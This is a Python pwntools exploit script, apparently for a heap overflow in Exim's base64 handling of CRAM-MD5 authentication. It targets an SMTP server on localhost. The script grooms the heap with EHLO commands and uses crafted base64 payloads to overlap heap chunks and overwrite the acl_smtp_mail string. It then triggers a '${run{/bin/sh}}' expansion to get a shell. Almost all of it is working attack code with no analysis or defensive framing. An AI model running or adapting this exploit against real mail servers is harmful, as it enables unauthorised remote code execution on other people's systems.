import time
import socket
import struct
from base64 import *
from pwn import *

# s = socket.create_connection(('127.0.0.1',25))
# f = s.makefile('rw', bufsize=0)
r=remote('127.0.0.1',25)


def ehlo(v):
    r.sendline("EHLO " + v)
    r.recvuntil('\n')

def auth_plain(v):
    r.sendline('AUTH PLAIN '+v)
    r.recvuntil('\n')
    # r.interactive()
def auth_md5(v):
    r.sendline('AUTH CRAM-MD5')
    r.recvuntil('\n')
    r.sendline(v)
    r.recvuntil('\n')

def unrec(v):
    r.sendline(v)
    r.recvuntil('command')


time.sleep(0.5)
#sender_helo_name
#0x71f470
ehlo('a'*0x1000)

ehlo('b'*0x20)
unrec('\xee'*0x800)
ehlo('x'*0x2020)
'''
chunk0  0x71f470    size:0x2050 
chunk1  0x7214c0    size:0x2030   <==   sender_helo_name
chunk2  0x7234f0    size:0x2ff0         double free?
'''
#overflow chunk0 to enlarge chukn1
payload = "d"*(0x2020+0x30-0x18-1)
auth_md5(b64encode(payload)+"EfE")
#fill chunk2 to fake a size to pass sanity check in glibc
payload2 = 'm'*0x38+p64(0x1f61) 
auth_md5(b64encode(payload2))

auth_md5(b64encode('a'*0x1000))

# pause()

#now free chunk1 to overlap part of chunk2
ehlo('pwn it!')   #must include space
#now we are trying to modify acl_smtp_mail
# pause()

acl_string_block=0x6f7990

payload3 = 'y'*0x2010 + p64(0) + p64(0x2021) + p64(acl_string_block+0x10) +p64(0x2008)

pause()
time.sleep(0.5)
auth_md5(b64encode(payload3))
pause()
time.sleep(0.5)
ehlo('I'*16)

payload4='J'*0x60+'${run{/bin/sh}}\x00'
payload4+=((0x500-len(payload4))*'J')
auth_md5(b64encode(payload4))

# pause()

r.sendline('MAIL FROM: <test@163.com>')

r.interactive()










